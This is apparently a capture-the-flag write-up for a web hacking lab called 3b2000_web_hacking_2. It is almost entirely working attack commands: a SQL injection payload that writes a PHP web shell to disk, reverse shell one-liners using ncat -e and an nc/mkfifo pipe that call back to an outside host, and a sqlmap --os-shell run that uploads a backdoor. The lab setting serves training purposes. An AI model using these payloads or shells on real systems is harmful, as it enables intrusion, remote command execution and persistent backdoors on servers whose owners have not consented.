# 3b2000_web_hacking_2

## the first solution
manual exploit, use sql injection to execute php code

```
# store php code in a file
jinjia%' union select 1,2,3, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/php/cmd.php' #
```

execute shell commands
```
http://10.0.2.197/php/cmd.php?cmd=find / -type f -name "*flag*" 2>/dev/null

/var/www/html/flag{3b2000bce661383f40def1bba8b2c4cad36c565423823f}.jpg
```

or we can get the reverse shell
```
nc -lvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
<Ctrl-Z>
stty raw -echo && fg  # reset
Terminal type?  xterm

# use `ncat`
http://10.0.2.197/php/cmd.php?cmd=ncat 192.168.0.7 4444 -e /bin/bash

# use `nc`
# %3b" is encoding for ";"
# %26" is encoding for "&"
# The + or %20 is used as a URL encoding for spaces.
# rm /tmp/f;bmkfifo /tmp/f;bcat /tmp/f | /bin/sh -i 2>&1|nc+192.168.0.7 4444 >/tmp/f
http://10.0.2.197/php/cmd.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.0.3+4444+>/tmp/f
```

## the second solution
`sqlmap` automate sql injection

```
sqlmap --url=http://10.0.2.197/php/recherche_old.php --cookie="PHPSESSID=p6gv5tl2udp0k9lqfvse3vpri3" --method=POST --data="recherche=jinjia&btnRechercher=Rechercher" -p recherche --os-shell --dbms=mysql 


[16:14:13] [INFO] the backdoor has been successfully uploaded on '/var/www/html/php/' - http://10.0.2.197:80/php/tmpbbrnf.php


http://10.0.2.197:80/php/tmpbbrnf.php?cmd=echo 123
```